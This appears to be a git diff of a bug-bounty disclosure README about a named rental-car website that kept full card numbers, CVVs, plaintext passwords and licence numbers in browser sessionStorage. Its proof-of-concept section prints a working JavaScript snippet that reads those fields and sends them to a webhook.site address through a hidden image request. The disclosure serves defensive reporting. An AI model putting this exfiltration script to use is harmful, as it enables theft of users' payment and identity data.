@@ -1,42 +1,43 @@
-# 🛑 Client-Side Sensitive Data Exposure – Full Credit Card, Password & ID Stored in Plaintext
+🛑 Client-Side Sensitive Data Exposure on Hertz.com – Full Credit Card, Password & ID Stored in Plaintext
 
-> Real-world disclosure of a critical web security flaw: full credit card details, login credentials, and ID numbers stored in plaintext in the browser's memory. Discovered and responsibly disclosed via HackerOne.
+Real-world disclosure of a critical web security flaw on Hertz.com: full credit card details, login credentials, and ID numbers stored in plaintext in the browser’s memory. Discovered and responsibly disclosed via Hertz’s public VDP on HackerOne.
 
----
+⸻
 
-## 📌 Summary
+📌 Summary
 
-This repository documents a **critical vulnerability** I discovered on a major website where **highly sensitive user data was stored in plaintext** in the browser using `sessionStorage` and cookies.
+This repository documents a critical vulnerability discovered on hertz.com, where highly sensitive user data was stored in plaintext in the browser using sessionStorage and cookies, in violation of industry standards.
 
-### Exposed Data:
-- Full credit card number (PAN), CVV, expiration date
-- Driver’s license number
-- Plaintext password
-- Full user profile (name, email, phone, address)
+Exposed Data:
+	•	Full credit card number (PAN), CVV, expiration date
+	•	Driver’s license number
+	•	Plaintext password
+	•	Full user profile (name, email, phone, address)
 
 This data was:
-- Not encrypted, hashed, or protected
-- Persisted across authenticated pages
-- Accessible to JavaScript and DevTools
-- Exfiltratable using a simple PoC without XSS or elevated privileges
+	•	Not encrypted, hashed, or protected
+	•	Persisted across multiple authenticated pages
+	•	Accessible to JavaScript, browser extensions, and DevTools
+	•	Exfiltratable using a minimal PoC without XSS or elevated privileges
 
----
+⸻
 
-## 🔍 Technical Overview
+🔍 Technical Overview
 
-After logging in, the browser's `sessionStorage` contained plaintext values for:
+After user login, the browser’s sessionStorage contained the following plaintext fields:
 
-```text
 creditCardNumber, creditCardExpireMonth, creditCardExpireYear,
 cvvNumber, skinnyPassword, driversLicense, personalAddress1,
 firstName, lastName, email, phone
-Any JavaScript running in the session context (e.g. browser extension, injected third-party widget) could access this information and exfiltrate it silently.
+
+Any JavaScript running in the session context (e.g., from injected third-party libraries, browser extensions, or future XSS) could silently access and exfiltrate this data.
 
 ⸻
 
 🧪 Proof of Concept
 
-A minimal exfiltration script, executed in the browser console or via a malicious extension:
+A minimal exfiltration script (executed in the browser console or by a malicious extension):
+
 var stealthImage = new Image();
 stealthImage.src = "https://webhook.site/xxx?" +
   "cc=" + encodeURIComponent(sessionStorage.getItem("creditCardNumber")) +
@@ -49,36 +50,53 @@ stealthImage.src = "https://webhook.site/xxx?" +
   "&phone=" + encodeURIComponent(sessionStorage.getItem("phone")) +
   "&url=" + encodeURIComponent(window.location.href);
 document.body.appendChild(stealthImage);
+
 📤 Data was successfully exfiltrated using Webhook.site, confirming real-world impact.
 
+⸻
+
 📜 Standards Violated
-	•	🔴 PCI DSS Requirement 3.2 – Storing CVV/PAN in plaintext after auth is strictly forbidden.
-	•	🟠 OWASP Secure Storage – Advises against storing sensitive data in browser storage.
-	•	🔵 GDPR / CCPA – Personal and financial data must be securely stored and processed.
+	•	🔴 PCI DSS 3.2 – Storing full credit card details and CVV post-authentication is strictly prohibited
+	•	🟠 OWASP Secure Storage – Recommends avoiding storage of sensitive data in browser-accessible memory
+	•	🔵 GDPR / CCPA – Mandate the secure storage and processing of personal and financial data
+
+⸻
+
 🔁 Vendor Response
 
-“Storing sensitive data in browser storage is not best practice, but not an exploit unless XSS or physical access is involved.”
-– HackerOne Triage
+The issue was responsibly disclosed via the Hertz Vulnerability Disclosure Program (VDP) on HackerOne.
 
-However, based on the working PoC, successful data exfiltration, and evidence of partial post-report mitigation, I’ve requested a formal re-evaluation.
+Initial triage feedback categorized the issue as Informative, stating:
+
+“The present issue appears to be a self-XSS, which is not directly exploitable or would require convincing the user to copy/paste the JavaScript payload into the vulnerable field.”
+— HackerOne Analyst
+
+While this rationale reflects a focus on exploitability in the current session, the presence of this sensitive data in browser-accessible memory constitutes a severe architectural vulnerability, especially when combined with potential future client-side injection points.
+
+A request for re-evaluation has been submitted, highlighting a successful PoC and partial post-report mitigation observed.
 
 ⸻
 
 🔐 Security Takeaways
 
-✔️ Never store sensitive data on the client side
-✔️ Assume anything in browser memory can be accessed by an attacker
-✔️ Don’t rely on “no XSS = no risk” logic — real-world attacks happen without injections
-✔️ Build with secure-by-design principles from day one
+✔️ Never store sensitive information like credit card data or plaintext passwords on the client side
+✔️ Treat all client-side storage as exposed
+✔️ Don’t rely on “no XSS now = no risk” — threat landscapes evolve
+✔️ Implement secure-by-design architecture from the beginning
+
+⸻
+
 👤 About the Researcher
 
 cybernomad42
-	•	Freelance pentester & bug bounty researcher
-	•	Security consultant specializing in client-side flaws, web app security, and compliance risks
+	•	Freelance pentester & bug bounty hunter
+	•	Security consultant focused on client-side flaws, web app security, and compliance
 	•	LinkedIn: linkedin.com/in/patrykkieszek
 	•	HackerOne: hackerone.com/cybernomad42
 
+⸻
+
 📂 Repository Tags
 
-bug-bounty pentesting sessionStorage plaintext-data credit-card-leak
+hertz bug-bounty pentesting sessionStorage plaintext-data credit-card-leak
 client-side-vulnerability pci-dss owasp javascript-security cybersecurity
